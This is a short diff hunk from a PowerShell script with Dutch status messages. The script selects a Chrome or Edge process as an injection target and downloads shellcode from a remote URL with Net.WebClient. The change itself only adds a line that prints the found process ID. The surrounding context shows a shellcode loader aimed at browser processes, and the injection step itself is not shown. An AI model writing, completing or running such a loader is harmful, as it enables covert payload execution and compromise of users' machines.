@@ -30,7 +30,7 @@ if (-not $edgeProcesses) {
 
 $targetProcess = $chromeProcesses | Sort-Object WorkingSet64 | Select-Object -First 1
 $targetPID = $targetProcess.Id
-
+Write-Host "[+] PID Gevonden -> $targetProcess.Id " -ForegroundColor Green
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
     Write-Host "[+] Download gelukt" -ForegroundColor Green
